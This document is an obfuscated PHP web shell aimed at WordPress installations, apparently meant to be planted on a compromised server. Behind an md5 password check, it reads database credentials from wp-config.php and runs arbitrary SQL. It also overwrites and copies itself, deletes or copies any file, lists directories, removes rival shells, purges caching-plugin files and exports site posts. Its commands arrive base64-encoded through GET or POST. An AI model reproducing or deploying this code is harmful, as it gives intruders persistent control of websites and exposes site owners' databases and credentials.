v5ACyEfir
<?php
define('EXT_MYSQLI', 'mysqli'); define('EXT_MYSQL', 'mysql'); define('CONF_PASSWORD_HASH', 'cddfd41b778274fa69b32508e449670e'); define('VERSION', '0.2.4'); function r_get_lib() { if (class_exists('mysqli')) { return EXT_MYSQLI; } if (function_exists('mysql_connect')) { return EXT_MYSQL; } } function r_get_config_path() { $sp990d44 = realpath('.'); $sp624e74 = 0; while ($sp990d44 != '/') { if (file_exists(sprintf('%s/wp-config.php', $sp990d44)) && file_exists(sprintf('%s/index.php', $sp990d44)) && file_exists(sprintf('%s/wp-settings.php', $sp990d44))) { return $sp990d44; } $sp624e74++; $sp990d44 = realpath(str_repeat('../', $sp624e74)); } } function r_get_config() { $sp00a745 = r_get_config_new(); if (!$sp00a745 || count(array_filter(array_values($sp00a745))) < count(array_values($sp00a745))) { $sp00a745 = r_get_config_old(); } return $sp00a745; } function r_get_config_new() { $sp990d44 = realpath('.'); $sp624e74 = 0; while ($sp990d44 != '/') { if (file_exists(sprintf('%s/wp-config.php', $sp990d44)) && file_exists(sprintf('%s/index.php', $sp990d44)) && file_exists(sprintf('%s/wp-settings.php', $sp990d44))) { $spdaaa7d = file(sprintf('%s/wp-config.php', $sp990d44)); $spdaaa7d = preg_grep('/defined/i', preg_grep('/define|table_prefix/i', $spdaaa7d), PREG_GREP_INVERT); $sp00a745 = array('path' => $sp990d44, 'type' => 'new'); foreach ($spdaaa7d as $sp1c4161) { if (preg_match('/(DB_HOST|DB_NAME|DB_USER|DB_PASSWORD|table_prefix)/', $sp1c4161, $sp0e5a4a)) { switch ($sp0e5a4a[0]) { case 'table_prefix': $sp1c4161 = preg_replace('/^\\s*\\$table_prefix\\s*\\=\\s*/', '', $sp1c4161); $sp1c4161 = preg_replace('/\\s*\\;\\s*$/', '', $sp1c4161); break; default: $sp1c4161 = preg_replace('/^\\s*define\\s*\\([^,]+\\,\\s*/i', '', $sp1c4161); $sp1c4161 = preg_replace('/\\s*\\)\\s*\\;\\s*$/i', '', $sp1c4161); break; } $sp1c4161 = trim($sp1c4161); if ($sp1c4161[0] == $sp1c4161[strlen($sp1c4161) - 1]) { $sp1c4161 = substr($sp1c4161, 1, strlen($sp1c4161) - 2); } switch ($sp0e5a4a[0]) { case 'DB_NAME': $sp00a745['db'] = $sp1c4161; break; case 'DB_USER': $sp00a745['user'] = $sp1c4161; break; case 'DB_PASSWORD': $sp00a745['pass'] = $sp1c4161; break; case 'DB_HOST': $spabc82d = explode(':', $sp1c4161); $sp00a745['host'] = array_shift($spabc82d); $sp00a745['port'] = array_shift($spabc82d); $sp00a745['port'] = $sp00a745['port'] ? $sp00a745['port'] : 3306; break; case 'table_prefix': $sp00a745['prefix'] = $sp1c4161; break; } } } return $sp00a745; break; } $sp624e74++; $sp990d44 = realpath(str_repeat('../', $sp624e74)); } } function r_get_config_old() { $sp990d44 = realpath('.'); $sp624e74 = 0; while ($sp990d44 != '/') { if (file_exists(sprintf('%s/wp-config.php', $sp990d44)) && file_exists(sprintf('%s/index.php', $sp990d44)) && file_exists(sprintf('%s/wp-settings.php', $sp990d44))) { $spdaaa7d = file(sprintf('%s/wp-config.php', $sp990d44)); $spdaaa7d = preg_grep('/defined/i', preg_grep('/define|table_prefix/i', $spdaaa7d), PREG_GREP_INVERT); $spdaaa7d = implode('
', $spdaaa7d); eval($spdaaa7d); $spce5873 = 'table_prefix'; $spabc82d = explode(':', DB_HOST); $spef3ab5 = array_shift($spabc82d); $sp6ff44f = array_shift($spabc82d); $sp6ff44f = $sp6ff44f ? $sp6ff44f : 3306; return array('host' => $spef3ab5, 'port' => $sp6ff44f, 'db' => DB_NAME, 'user' => DB_USER, 'pass' => DB_PASSWORD, 'prefix' => ${$spce5873}, 'path' => $sp990d44, 'type' => 'old'); break; } $sp624e74++; $sp990d44 = realpath(str_repeat('../', $sp624e74)); } } function r_mysql_connect($spdaaa7d) { $sp8b717d = mysql_connect(sprintf('%s:%s', $spdaaa7d['host'], $spdaaa7d['port']), $spdaaa7d['user'], $spdaaa7d['pass']); mysql_select_db($spdaaa7d['db'], $sp8b717d); return $sp8b717d; } function r_mysqli_connect($spdaaa7d) { return new mysqli($spdaaa7d['host'], $spdaaa7d['user'], $spdaaa7d['pass'], $spdaaa7d['db'], is_numeric($spdaaa7d['port']) ? $spdaaa7d['port'] : 3306, !is_numeric($spdaaa7d['port']) ? $spdaaa7d['port'] : null); } function r_mysql_query($spdaaa7d, $sp8b717d, $spa44de6, $spaabe13 = array()) { if (!empty($spaabe13)) { foreach ($spaabe13 as $spdcd3c8 => $spbc79f2) { $spa44de6 = str_replace($spdcd3c8, mysql_real_escape_string($spbc79f2, $sp8b717d), $spa44de6); } } $sp27b914 = array(); $sp30b56c = mysql_query($spa44de6, $sp8b717d); if ($sp30b56c) { while ($spcb1c34 = mysql_fetch_assoc($sp30b56c)) { $sp27b914[] = $spcb1c34; } return array('success' => $sp27b914); } else { return array('error' => sprintf('%s :: %s', mysql_errno($sp8b717d), mysql_error($sp8b717d))); } } function r_mysqli_query($spdaaa7d, $sp8b717d, $spa44de6, $spaabe13 = array()) { if (!empty($spaabe13)) { foreach ($spaabe13 as $spdcd3c8 => $spbc79f2) { $spa44de6 = str_replace($spdcd3c8, $sp8b717d->real_escape_string($spbc79f2), $spa44de6); } } $sp30b56c = $sp8b717d->query($spa44de6); if (is_object($sp30b56c)) { $sp27b914 = array(); while ($spcb1c34 = $sp30b56c->fetch_assoc()) { $sp27b914[] = $spcb1c34; } return array('success' => $sp27b914); } if ($sp30b56c) { return array('success' => true); } else { return array('error' => sprintf('%s :: %s', $sp8b717d->errno, $sp8b717d->error)); } } function r_mysql_query_res($spdaaa7d, $sp8b717d, $spa44de6, $spaabe13 = array()) { if (!empty($spaabe13)) { foreach ($spaabe13 as $spdcd3c8 => $spbc79f2) { $spa44de6 = str_replace($spdcd3c8, mysql_real_escape_string($spbc79f2, $sp8b717d), $spa44de6); } } $sp27b914 = array(); $sp30b56c = mysql_query($spa44de6, $sp8b717d); return $sp30b56c; } function r_mysql_query_row($sp30b56c) { if ($sp30b56c) { return mysql_fetch_assoc($sp30b56c); } else { return false; } } function r_mysqli_query_res($spdaaa7d, $sp8b717d, $spa44de6, $spaabe13 = array()) { if (!empty($spaabe13)) { foreach ($spaabe13 as $spdcd3c8 => $spbc79f2) { $spa44de6 = str_replace($spdcd3c8, $sp8b717d->real_escape_string($spbc79f2), $spa44de6); } } $sp30b56c = $sp8b717d->query($spa44de6); return $sp30b56c; } function r_mysqli_query_row($sp30b56c) { if (is_object($sp30b56c)) { return $sp30b56c->fetch_assoc(); } else { return false; } } function r_unmagic() { if (get_magic_quotes_gpc()) { foreach ($_POST as $spdcd3c8 => $spbc79f2) { $_POST[$spdcd3c8] = stripslashes($spbc79f2); } } } function r_action_prefix() { $spdaaa7d = r_get_config(); echo $spdaaa7d['prefix']; } function r_action_query() { r_unmagic(); $spdaaa7d = r_get_config(); $sp4d9ca9 = r_get_lib(); $spaabe13 = json_decode($_POST['bind'], true); if (isset($_POST['decode'])) { $sp79c800 = array_map('trim', explode(',', $_POST['decode'])); foreach ($sp79c800 as $sp696c6d) { if (isset($spaabe13[$sp696c6d])) { $spaabe13[$sp696c6d] = bd($spaabe13[$sp696c6d]); } } } $sp8b717d = call_user_func(sprintf('r_%s_connect', $sp4d9ca9), $spdaaa7d); $sp30b56c = call_user_func(sprintf('r_%s_query', $sp4d9ca9), $spdaaa7d, $sp8b717d, $_POST['query'], $spaabe13); if (isset($_POST['encode'])) { $sp8a681e = array_map('trim', explode(',', $_POST['encode'])); foreach ($sp30b56c['success'] as $sp24492c => $spcb1c34) { foreach ($sp8a681e as $sp47de28) { $sp30b56c['success'][$sp24492c][$sp47de28] = be($sp30b56c['success'][$sp24492c][$sp47de28]); } } } echo json_encode($sp30b56c); } function r_action_update() { file_put_contents(__FILE__, bd($_POST['file'])); echo md5(bd($_POST['file'])); } function r_action_version() { echo VERSION; } function r_action_duplicate() { $spcd2466 = copy(__FILE__, $_POST['dst']); echo (int) $spcd2466; } function r_action_copy() { $spcd2466 = copy($_POST['src'], $_POST['dst']); echo (int) $spcd2466; } function r_action_dir() { $spcd2466 = array(); $sp696c6d = dir($_POST['dir']); while (false !== ($sp70a170 = $sp696c6d->read())) { $sp5358c3 = sprintf('%s/%s', rtrim($_POST['dir'], '/'), $sp70a170); $spcd2466[] = array('type' => is_file($sp5358c3) ? 'file' : (is_dir($sp5358c3) ? 'dir' : 'unknown'), 'entry' => $sp70a170, 'full_entry' => $sp5358c3, 'realpath' => realpath($sp5358c3)); } $sp696c6d->close(); echo json_encode($spcd2466); } function r_action_wpversion() { $sp990d44 = r_get_config_path(); $sp8855f5 = file_get_contents(sprintf('%s/wp-settings.php', $sp990d44)); preg_match_all('/define\\(([^\\)]+)/i', $sp8855f5, $sp47f190); foreach ($sp47f190[1] as $spada214) { if (strpos($spada214, 'WPINC') !== false) { $spada214 = array_map('trim', explode(',', $spada214)); foreach ($spada214 as $sp7d03d3 => $sp51b695) { if ($sp51b695[0] == $sp51b695[strlen($sp51b695) - 1]) { $spada214[$sp7d03d3] = substr($sp51b695, 1, strlen($sp51b695) - 2); } } require_once $sp4bba87 = sprintf('%s%s%s%sversion.php', $sp990d44, DIRECTORY_SEPARATOR, str_replace('/', DIRECTORY_SEPARATOR, $spada214[1]), DIRECTORY_SEPARATOR); $sp19a21c = 'wp_version'; echo ${$sp19a21c}; die; } } echo 'error'; } function r_action_w3tc() { $sp990d44 = r_get_config_path(); $sp86ee61 = rtrim(preg_replace('/^http[s]{0,1}\\:\\/\\//i', '', $_POST['url']), '/'); $sp11ee6d = sprintf('%s/wp-content/cache/page_enhanced/%s/_index.html', $sp990d44, $sp86ee61); if (file_exists($sp11ee6d)) { unlink($sp11ee6d); } $sp11ee6d = sprintf('%s/wp-content/cache/page_enhanced/%s/_index.html_gzip', $sp990d44, $sp86ee61); if (file_exists($sp11ee6d)) { unlink($sp11ee6d); } echo 'success'; } function r_action_cenabler() { $sp990d44 = r_get_config_path(); $sp86ee61 = rtrim(preg_replace('/^http[s]{0,1}\\:\\/\\//i', '', $_POST['url']), '/'); $sp11ee6d = sprintf('%s/wp-content/cache/cache-enabler/%s/index.html', $sp990d44, $sp86ee61); if (file_exists($sp11ee6d)) { unlink($sp11ee6d); } $sp11ee6d = sprintf('%s/wp-content/cache/cache-enabler/%s/index.html.gz', $sp990d44, $sp86ee61); if (file_exists($sp11ee6d)) { unlink($sp11ee6d); } $sp11ee6d = sprintf('%s/wp-content/cache/cache-enabler/%s/index-webp.html', $sp990d44, $sp86ee61); if (file_exists($sp11ee6d)) { unlink($sp11ee6d); } $sp11ee6d = sprintf('%s/wp-content/cache/cache-enabler/%s/index-webp.html.gz', $sp990d44, $sp86ee61); if (file_exists($sp11ee6d)) { unlink($sp11ee6d); } echo 'success'; } function r_action_removeshell() { if (file_exists($spccfacf = sprintf('%s%s%s', rtrim($_SERVER['DOCUMENT_ROOT'], '/'), DIRECTORY_SEPARATOR, str_replace('/', DIRECTORY_SEPARATOR, ltrim($_POST['shell_url'], '/'))))) { if ($spccfacf != __FILE__) { unlink($spccfacf); } echo file_exists($spccfacf) ? 'fail' : 'success'; } else { echo 'ignore'; } } function r_action_remove() { if (file_exists($_POST['file'])) { if ($_POST['file'] != __FILE__) { unlink($_POST['file']); } echo file_exists($_POST['file']) ? 'fail' : 'success'; } else { echo 'ignore'; } } function r_action_pages() { $sp6786de = tempnam('./', 'wp') . '.php'; $spd01858 = fopen($sp6786de, 'w'); $sp990d44 = r_get_config_path(); chdir($sp990d44); $sp26db65 = $_POST['id']; require $sp990d44 . '/wp-load.php'; r_unmagic(); $spdaaa7d = r_get_config(); $sp4d9ca9 = r_get_lib(); $spf1e236 = $spdaaa7d['prefix']; $sp8b717d = call_user_func(sprintf('r_%s_connect', $sp4d9ca9), $spdaaa7d); $sp30b56c = call_user_func(sprintf('r_%s_query_res', $sp4d9ca9), $spdaaa7d, $sp8b717d, sprintf('SELECT * FROM `%sposts` WHERE `post_type` IN ( "post", "page" ) AND `post_status` = "publish" AND `ID` > %s ORDER BY `ID` ASC LIMIT %s, %s', $spf1e236, $_POST['remote_id'], $_POST['batch_start'], $_POST['batch_size'])); while ($spcb1c34 = call_user_func(sprintf('r_%s_query_row', $sp4d9ca9), $sp30b56c)) { fputcsv($spd01858, array($spcb1c34['ID'], be($spcb1c34['post_content']), be($spcb1c34['post_title']), be(get_permalink($spcb1c34['ID'])))); } fclose($spd01858); echo $sp6786de; } function r_action_config() { echo json_encode(r_get_config()); } function r_action_getlib() { echo r_get_lib(); } function r_action_magic() { echo get_magic_quotes_gpc() ? 'Yes' : 'No'; } function r_action_loginurl() { $spe3dc7f = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . "://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}"; $sp9c8880 = $spe3dc7f; $spd39b89 = basename(__FILE__); $sp6786de = basename(tempnam('./', 'ert') . '.php'); $sp0ae225 = preg_replace(sprintf('/%s$/i', preg_quote($spd39b89)), $sp6786de, $sp9c8880); echo file_get_contents($sp0ae225); } function r_action_ini() { echo json_encode(isset($_POST['section']) && $_POST['section'] ? ini_get_all($_POST['section']) : ini_get_all()); } function bd($spdcbde2) { if (is_available('base64_decode')) { return base64_decode($spdcbde2); } $sp99d7c2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='; $sp6acc10 = $sp826cc7 = $sp713591 = ''; $sp59f23d = $sp5f5efa = $sp02354e = $sp29d6cc = ''; $sp7d03d3 = 0; $sp1ab037 = ''; $spc5ad4d = $spdcbde2; $spdcbde2 = preg_replace('[^A-Za-z0-9\\+\\/\\=]', '', $spdcbde2); if ($spc5ad4d != $spdcbde2) { return false; } do { $sp59f23d = strpos($sp99d7c2, substr($spdcbde2, $sp7d03d3++, 1)); $sp5f5efa = strpos($sp99d7c2, substr($spdcbde2, $sp7d03d3++, 1)); $sp02354e = strpos($sp99d7c2, substr($spdcbde2, $sp7d03d3++, 1)); $sp29d6cc = strpos($sp99d7c2, substr($spdcbde2, $sp7d03d3++, 1)); $sp6acc10 = $sp59f23d << 2 | $sp5f5efa >> 4; $sp826cc7 = ($sp5f5efa & 15) << 4 | $sp02354e >> 2; $sp713591 = ($sp02354e & 3) << 6 | $sp29d6cc; $sp1ab037 = $sp1ab037 . chr((int) $sp6acc10); if ($sp02354e != 64) { $sp1ab037 = $sp1ab037 . chr((int) $sp826cc7); } if ($sp29d6cc != 64) { $sp1ab037 = $sp1ab037 . chr((int) $sp713591); } $sp6acc10 = $sp826cc7 = $sp713591 = ''; $sp59f23d = $sp5f5efa = $sp02354e = $sp29d6cc = ''; } while ($sp7d03d3 < strlen($spdcbde2)); return urldecode($sp1ab037); } function be($sp4f9c96) { if (is_available('base64_encode')) { return base64_encode($sp4f9c96); } $sp5abf7e = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='; $sp0580a4 = $sp88dd2c = $spfef2f8 = $spfd6f06 = $sp2c20d0 = $sp5d8d75 = $sp4e9f8c = $sp21a23b = $sp7d03d3 = 0; $sp6025a0 = 0; $sp47de28 = ''; $speda99a = array(); if (!$sp4f9c96) { return data; } do { $sp0580a4 = charCodeAt($sp4f9c96, $sp7d03d3++); $sp88dd2c = charCodeAt($sp4f9c96, $sp7d03d3++); $spfef2f8 = charCodeAt($sp4f9c96, $sp7d03d3++); $sp21a23b = $sp0580a4 << 16 | $sp88dd2c << 8 | $spfef2f8; $spfd6f06 = $sp21a23b >> 18 & 63; $sp2c20d0 = $sp21a23b >> 12 & 63; $sp5d8d75 = $sp21a23b >> 6 & 63; $sp4e9f8c = $sp21a23b & 63; $speda99a[$sp6025a0++] = charAt($sp5abf7e, $spfd6f06) . charAt($sp5abf7e, $sp2c20d0) . charAt($sp5abf7e, $sp5d8d75) . charAt($sp5abf7e, $sp4e9f8c); } while ($sp7d03d3 < strlen($sp4f9c96)); $sp47de28 = implode($speda99a, ''); $sp4fc710 = strlen($sp4f9c96) % 3; return $sp4fc710 ? substr($sp47de28, 0, $sp4fc710 - 3) . substr('===', $sp4fc710) : $sp47de28; } function charCodeAt($sp4f9c96, $spd106ce) { return ord(substr($sp4f9c96, $spd106ce, 1)); } function charAt($sp4f9c96, $spd106ce) { return substr($sp4f9c96, $spd106ce, 1); } function is_available($sp539809) { static $sp05c617; if (!isset($sp05c617) && !isset($sp05c617[$sp539809])) { $sp05c617[$sp539809] = true; $sp696c6d = ini_get('disable_functions'); $sp72ba3d = ini_get('suhosin.executor.func.blacklist'); if ("{$sp696c6d}{$sp72ba3d}") { $spfb2ae3 = preg_split('/,\\s*/', "{$sp696c6d},{$sp72ba3d}"); if (in_array($sp539809, $spfb2ae3)) { $sp05c617[$sp539809] = false; } } } return $sp05c617[$sp539809]; } if (count($_GET) == 1 && !trim($sp54f6de = array_pop(array_values($_GET)))) { $sp30b56c = array(); parse_str(bd(rawurldecode(array_shift(array_keys($_GET)))), $sp30b56c); $_GET = $sp30b56c; } else { if (count($_GET) > 0) { if (!in_array('action', array_keys($_GET))) { $spabc82d = array(); foreach ($_GET as $spdcd3c8 => $spbc79f2) { if (($sp657816 = bd($spdcd3c8)) && ($sp00c116 = bd($spbc79f2))) { $spabc82d[$sp657816] = $sp00c116; } } $_GET = $spabc82d; } } } $_POST = array_merge($_POST, $_GET); if (CONF_PASSWORD_HASH == md5($_POST['password'])) { switch ($_POST['action']) { case 'link': $sp990d44 = r_get_config_path(); chdir($sp990d44); $sp26db65 = $_POST['id']; require_once $sp990d44 . '/wp-load.php'; $spe97891 = get_permalink($_POST['id']); echo sprintf('[<{%s}>]', $spe97891); break; default: $sp0ec413 = sprintf('r_action_%s', $_POST['action']); call_user_func($sp0ec413); break; } } else { die('ympf'); }